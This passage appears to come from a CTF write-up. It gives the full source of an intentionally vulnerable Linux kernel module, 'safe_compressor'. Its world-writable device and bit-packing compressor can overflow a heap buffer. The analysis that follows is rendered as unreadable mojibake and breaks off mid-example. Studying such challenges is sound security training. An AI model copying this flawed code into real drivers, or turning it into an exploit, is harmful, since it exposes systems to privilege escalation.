class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;M0ngi&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Super safe compressor&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;safe_compressor&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_COMPRESS 0xdead0001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_DECOMPRESS 0xdead0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_DELETE 0xdead0003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_EMPTY 0xdead0004</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITEMS 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARRAY_SIZE 20</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compressed_arr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">compressed_arr</span> *<span class="title">compressed_data</span>[<span class="title">MAX_ITEMS</span>] =</span> &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">g_mutex</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">compress</span><span class="params">(<span class="type">int</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">unsigned</span> <span class="type">char</span> **compressed, <span class="type">long</span> <span class="type">unsigned</span> *out_size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">decompress</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">int</span> **output, <span class="type">long</span> <span class="type">unsigned</span> *out_size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_empty_idx</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">write_bit_to_result</span><span class="params">(<span class="type">int</span> current_bit, <span class="type">unsigned</span> <span class="type">char</span> **ptr, <span class="type">unsigned</span> <span class="type">long</span> *idx, <span class="type">unsigned</span> <span class="type">long</span> *bits)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_obj_by_id</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> id)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">g_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open = vuln_open,</span><br><span class="line">    .release = vuln_release,</span><br><span class="line">    .unlocked_ioctl = vuln_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">g_device</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name = DEVICE_NAME,</span><br><span class="line">    .fops = &amp;g_fops,</span><br><span class="line">    .mode = <span class="number">0666</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">decompress_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">empty_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_empty_idx</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ITEMS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (compressed_data[i] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_obj_by_id</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ITEMS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (compressed_data[i] != <span class="literal">NULL</span> &amp;&amp; compressed_data[i]-&gt;idx == id)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Open the device.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Close the device.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_compress</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    <span class="type">int</span> user_array[MAX_ARRAY_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_empty_idx();</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arg_struct.size &lt;= <span class="number">0</span> || arg_struct.size &gt; MAX_ARRAY_SIZE)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(user_array, <span class="number">0</span>, arg_struct.size * <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(user_array, arg_struct.<span class="built_in">array</span>, arg_struct.size * <span class="number">4</span>))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    compressed_data[idx] = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> compressed_arr), GFP_KERNEL);</span><br><span class="line">    compressed_data[idx]-&gt;idx = arg_struct.idx;</span><br><span class="line">    compress(user_array, arg_struct.size, &amp;compressed_data[idx]-&gt;data, &amp;compressed_data[idx]-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_delete</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_obj_by_id(arg_struct.idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    kfree(compressed_data[idx]-&gt;data);</span><br><span class="line">    compressed_data[idx]-&gt;data = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(compressed_data[idx]);</span><br><span class="line">    compressed_data[idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_empty</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_obj_by_id(arg_struct.idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(compressed_data[idx]-&gt;data, <span class="number">0</span>, compressed_data[idx]-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_decompress</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">decompress_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_obj_by_id(arg_struct.idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *decompressed;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> decompressed_size;</span><br><span class="line"></span><br><span class="line">    decompress(compressed_data[idx]-&gt;data, compressed_data[idx]-&gt;size, &amp;decompressed, &amp;decompressed_size);</span><br><span class="line">    <span class="type">int</span> size = min(arg_struct.size * <span class="number">4</span>, decompressed_size * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(arg_struct.<span class="built_in">array</span>, decompressed, size))</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(decompressed);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kfree(decompressed);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Handle ioctl calls.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> __user *argp = (<span class="type">void</span> __user *)arg;</span><br><span class="line">    <span class="type">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mutex_trylock(&amp;g_mutex))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_COMPRESS:</span><br><span class="line">        err = ioctl_compress(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_DECOMPRESS:</span><br><span class="line">        err = ioctl_decompress(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_DELETE:</span><br><span class="line">        err = ioctl_delete(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_EMPTY:</span><br><span class="line">        err = ioctl_empty(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutex_unlock(&amp;g_mutex);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">write_bit_to_result</span><span class="params">(<span class="type">int</span> current_bit, <span class="type">unsigned</span> <span class="type">char</span> **ptr, <span class="type">unsigned</span> <span class="type">long</span> *idx, <span class="type">unsigned</span> <span class="type">long</span> *bits)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mask = ~(<span class="number">1</span> &lt;&lt; *idx);</span><br><span class="line">    (**ptr) &amp;= mask;</span><br><span class="line">    (**ptr) |= (current_bit &lt;&lt; *idx);</span><br><span class="line"></span><br><span class="line">    (*idx)++;</span><br><span class="line">    (*bits)++;</span><br><span class="line">    <span class="keyword">if</span> (*idx == <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *idx = <span class="number">0</span>;</span><br><span class="line">        (*ptr)++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">compress</span><span class="params">(<span class="type">int</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">unsigned</span> <span class="type">char</span> **compressed, <span class="type">unsigned</span> <span class="type">long</span> *out_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    *compressed = kzalloc(<span class="keyword">sizeof</span>(<span class="type">int</span>) * size, GFP_KERNEL);</span><br><span class="line">    *out_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *ptr = *compressed;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx = <span class="number">0</span>; <span class="comment">// From 0 to 7, indexing *ptr</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> bits = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Here we have 32bits</span></span><br><span class="line">        <span class="type">int</span> curr_byte = input[i];</span><br><span class="line">        <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((curr_byte != <span class="number">0</span> &amp;&amp; offset &lt;= <span class="number">31</span>) || (curr_byte == <span class="number">0</span> &amp;&amp; offset &lt;= <span class="number">6</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Copy first 7 bits</span></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">7</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> current_bit = curr_byte &amp; <span class="number">1</span>;</span><br><span class="line">                curr_byte = curr_byte &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                offset++;</span><br><span class="line"></span><br><span class="line">                write_bit_to_result(current_bit, &amp;ptr, &amp;idx, &amp;bits);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (offset == <span class="number">7</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                write_bit_to_result(<span class="number">1</span>, &amp;ptr, &amp;idx, &amp;bits); <span class="comment">// Stop bit</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                write_bit_to_result(<span class="number">0</span>, &amp;ptr, &amp;idx, &amp;bits);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *out_size = bits / <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">decompress</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">int</span> **output, <span class="type">unsigned</span> <span class="type">long</span> *out_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Worst case: each byte has a stop bit, means each byte will become an int</span></span><br><span class="line">    *out_size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> *res = kmalloc(size * <span class="number">4</span>, GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> curr_byte = input[i];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> is_stop = curr_byte &amp; <span class="number">0b10000000</span>;</span><br><span class="line">        <span class="type">int</span> value = curr_byte &amp; <span class="number">0b01111111</span>;</span><br><span class="line"></span><br><span class="line">        sum = (sum &lt;&lt; offset) | value;</span><br><span class="line">        offset += <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_stop)</span><br><span class="line">        &#123;</span><br><span class="line">            offset = <span class="number">0</span>;</span><br><span class="line">            res[(*out_size)++] = sum;</span><br><span class="line">            sum = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *output = kmalloc(*out_size * <span class="number">4</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; *out_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        (*output)[i] = res[*out_size - i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    kfree(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Initialisation function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    mutex_init(&amp;g_mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create the device */</span></span><br><span class="line">    err = misc_register(&amp;g_device);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;safe_compression: Failed to misc_register\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;safe_compression: module initialized\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Cleanup function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// int i;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for (i = 0; i &lt; VULN_MAX_CHANNELS; i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     vuln_destroy_channel(i);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    misc_deregister(&amp;g_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;vuln: module exited\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æä¸åˆ©ç”¨"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h2><p>è¿™ä¸ªå†…æ ¸é©±åŠ¨å®ç°äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„æ•°æ®å‹ç¼©ä¸è§£å‹ï¼Œä¸€å…±æœ‰å››ä¸ªåŠŸèƒ½ï¼Œæ€»ç»“å¦‚ä¸‹ï¼š<br>compressï¼šæ ¹æ®ç”¨æˆ·è¾“å…¥çš„æ•°æ®çš„å¤§å°åˆ†é…ç›¸åº”å¤§å°çš„å †å—ï¼Œç”¨è‡ªå®šä¹‰çš„å‹ç¼©ç®—æ³•é™æ•°æ®å‹ç¼©åå†™å…¥åˆ°ç”³è¯·çš„å †å—ä¸­ï¼Œæœ€å¤šå¯ä»¥ç”³è¯· 200 ä¸ªå †å—<br>decompressï¼šé€‰ä¸­å…¶ä¸­ä¸€ä¸ªå †å—å¹¶å°†å…¶å†…å®¹è¿›è¡Œè§£å‹è¿”å›ç»™ç”¨æˆ·<br>deleteï¼šé‡Šæ”¾æŒ‡å®šçš„å †å—ï¼Œè¿™é‡Œåœ¨è°ƒç”¨ kfree åè®²æŒ‡é’ˆæ¸…ç©ºäº†ï¼Œä¸å­˜åœ¨ UAF<br>emptyï¼šå°†å½“å‰å †å—æ¸…ç©º  </p><p>è¿™é‡Œç”¨è„šéƒ½èƒ½æƒ³åˆ°æ¼æ´è‚¯å®šå‡ºç°åœ¨è¿™ä¸ªå‹ç¼©ç®—æ³•ä¸Šï¼Œè¯¥åŠ å¯†ç®—æ³•çš„å†™çš„æŒºæŠ½è±¡çš„ï¼Œå…¶å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š<br>å°†æ¯ä¸ª 32 bit çš„ int å¯¹è±¡æŒ‰ 7 bit è¿›è¡Œåˆ†ç»„ï¼Œç„¶ååœ¨æ¯ç»„çš„æœ€é«˜ä½åŠ ä¸Šä¸€ä¸ª bit å˜æˆä¸€å­—èŠ‚çš„æ•°æ®å†™å…¥åˆ°å †å†…å­˜ä¸­ã€‚å¦‚æœå½“å‰ç»„æ˜¯å½“å‰ 32 bit çš„ int å¯¹è±¡çš„ç¬¬ä¸€ç»„ï¼Œåˆ™æœ€é«˜ä½çš„ bit ä¸º 1ï¼Œå…¶ä»–æƒ…å†µä¸‹éƒ½ä¸º 0ã€‚å¦‚æœå½“å‰åˆ†ç»„çš„å€¼ä¸º 0 ä¸”ä¸ä¸º int å¯¹è±¡çš„ç¬¬ä¸€ä¸ªç»„ï¼Œåˆ™ç›´æ¥åœæ­¢å¯¹è¯¥ int å¯¹è±¡çš„å‹ç¼©ï¼Œå¼€å§‹å¤„ç†ä¸‹ä¸€ä¸ª int å¯¹è±¡ã€‚å¦‚æœå½“å‰åˆ†ç»„çš„å€¼ä¸º 0 ä¸”ä¸º int çš„å¯¹è±¡çš„ç¬¬ä¸€ä¸ªç»„ï¼Œåˆ™å†™å…¥è¿™ç¬¬ä¸€ä¸ªåˆ†ç»„ï¼ˆå½“ç„¶æœ€é«˜ä½ä¾ç„¶è¦è¡¥ 1ï¼‰ç„¶åç›´æ¥è¿›è¡Œä¸‹ä¸€ä¸ª int çš„å‹ç¼©</p><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œç›´æ¥ä¸¾ä¸ªä¾‹å­:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="number">0</span>] = <span class="number">0x11111111</span>;</span><br><span class="line">compress(<span class="number">0</span>,data,<span 